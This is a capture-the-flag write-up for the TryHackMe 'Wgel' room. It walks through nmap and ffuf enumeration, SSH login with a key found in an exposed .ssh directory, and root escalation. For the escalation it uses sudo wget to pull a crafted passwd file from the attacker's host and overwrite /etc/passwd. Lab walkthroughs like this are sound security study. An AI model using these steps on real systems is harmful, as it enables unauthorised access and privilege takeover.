# Wgel

![image](https://user-images.githubusercontent.com/5285547/129208041-00185729-3d6d-4201-96c2-2f5b4290788b.png)

Room link: https://tryhackme.com/room/wgelctf

## Enum

Nmap 

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Port 80

On the main page is the default apache home page, in the source code of the page i noted a strange entry.

![image](https://user-images.githubusercontent.com/5285547/129208602-3b5d53b2-0177-402b-9980-ff5298d0692c.png)

Directory brute forcing

```
ffuf -u http://10.10.210.172/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 403 -ic 

sitemap                 [Status: 301, Size: 316, Words: 20, Lines: 10]
```

![image](https://user-images.githubusercontent.com/5285547/129208772-2a5bf93d-f9fb-4222-886a-53b1848efc92.png)

fuzzing sitemap shows an .ssh dir 

```
ffuf -u http://10.10.210.172/sitemap/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -fc 403 -ic

index.html              [Status: 200, Size: 21080, Words: 1305, Lines: 517]
contact.html            [Status: 200, Size: 10346, Words: 500, Lines: 287]
.                       [Status: 200, Size: 21080, Words: 1305, Lines: 517]
about.html              [Status: 200, Size: 12232, Words: 684, Lines: 313]
blog.html               [Status: 200, Size: 12745, Words: 738, Lines: 313]
services.html           [Status: 200, Size: 10131, Words: 543, Lines: 288]
shop.html               [Status: 200, Size: 17257, Words: 715, Lines: 448]
.ssh                    [Status: 301, Size: 321, Words: 20, Lines: 10]
work.html               [Status: 200, Size: 11428, Words: 574, Lines: 329]
```

![image](https://user-images.githubusercontent.com/5285547/129209591-5161d2cd-03b5-4d23-9956-cab5769ac146.png)

---

## User

Using this and the username we found we can ssh onto the machine as jessie and get the user flag. 

![image](https://user-images.githubusercontent.com/5285547/129209802-26f843ae-8a53-40a3-bfc5-568861b17fe9.png)
![image](https://user-images.githubusercontent.com/5285547/129210363-46f4e0ff-9432-42a7-90ba-1247daf63fdb.png)

---

## Root

Checking sudo -l shows us wget can run as root with no password. 

![image](https://user-images.githubusercontent.com/5285547/129210492-898374e2-5cc4-4b3d-a41e-10c22e724baa.png)

I checked GTFObins to see what could help and thought we can overwrite /etc/passwd with a new user. 

So cat out /etc/passswd and make a copy then add a new user at the end of the file after making a new password. 

```
openssl passwd -1 -salt PwNeD pass123
$1$PwNeD$/XBKVYADYvAq/cezsMbwD.
```


Now host the file and use wget to overwrite the origianl 

```
sudo /usr/bin/wget http://10.8.153.120/passwd /etc/passwd
```

![image](https://user-images.githubusercontent.com/5285547/129212909-f06e3601-e67e-481d-b6fb-b96a0e1635ef.png)

Then we change user with our new password and grab the last flag. 

![image](https://user-images.githubusercontent.com/5285547/129213080-853b473e-9170-445f-9adb-c3bcf60922cf.png)

